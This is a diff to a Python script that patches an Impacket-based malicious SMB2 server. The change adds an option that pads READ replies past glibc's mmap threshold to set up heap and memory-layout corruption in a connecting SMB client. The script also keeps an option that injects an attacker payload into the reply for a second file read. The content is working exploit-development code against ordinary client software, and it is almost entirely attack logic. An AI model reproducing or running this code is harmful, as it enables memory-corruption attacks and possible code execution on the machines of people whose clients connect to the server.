@@ -46,6 +46,12 @@ _ORIG_QFI = SMB2Commands.smb2QueryInfo if hasattr(SMB2Commands, "smb2QueryInfo")
 DLEN = 0
 if "--dlen" in sys.argv:
     DLEN = int(sys.argv[sys.argv.index("--dlen") + 1])
+# RPAD>0 pads the READ reply BUFFER to RPAD bytes (SPL-declared => the client's
+# variable-part recv malloc = RPAD). Crosses the glibc 2.23 mmap threshold at
+# 131072 => free() munmaps a hole; the buffer end is page-guard-adjacent.
+RPAD = 0
+if "--rpad" in sys.argv:
+    RPAD = int(sys.argv[sys.argv.index("--rpad") + 1])
 INJECT = b""
 MIDOFF = 3
 PAYLOAD = b"INJECTED\r\n"
@@ -86,16 +92,25 @@ def patched_rd(connId, smbServer, recvPacket):
     res = _ORIG_RD(connId, smbServer, recvPacket)
     _READ_COUNT[connId] = _READ_COUNT.get(connId, 0) + 1
     second = _READ_COUNT[connId] == 2
-    if (DLEN or INJECT or PAYLOAD) and (INJECT or PAYLOAD) and second and connId not in _PATCHED_CONNS:
+    if RPAD or ((DLEN or INJECT or PAYLOAD) and (INJECT or PAYLOAD) and second) or DLEN:
         try:
-            _PATCHED_CONNS.add(connId)
             resp = res[0][0]
             raw = resp['Buffer']
             if not isinstance(raw, (bytes, bytearray)):
                 raw = raw.getData()
             buf = bytearray(raw)
             real = len(buf)
-            if (INJECT or PAYLOAD) and real and PAYLOAD and second:
+            if RPAD and real:
+                # pad the READ reply buffer to RPAD bytes: the SPL-declared
+                # length sizes the client's variable-part recv malloc, so
+                # RPAD > 131072 puts that malloc on the mmap path.
+                pad = RPAD - real
+                if pad > 0:
+                    buf = buf + b"A" * pad
+                resp['Buffer'] = bytes(buf)
+                resp['DataLength'] = len(buf)
+                print('READ rpad: real=%d padded=%d' % (real, len(buf)), flush=True)
+            elif (INJECT or PAYLOAD) and real and PAYLOAD and second:
                 # clean second-READ replacement: the folder.jpg READ reply
                 # carries MY payload with correct DataLength (no desync).
                 resp['Buffer'] = bytes(PAYLOAD)
@@ -128,7 +143,7 @@ def patched_rd(connId, smbServer, recvPacket):
     return res
 
 
-if DLEN or INJECT or PAYLOAD:
+if DLEN or INJECT or PAYLOAD or RPAD:
     SMB2Commands.smb2Read = staticmethod(patched_rd)
 
 
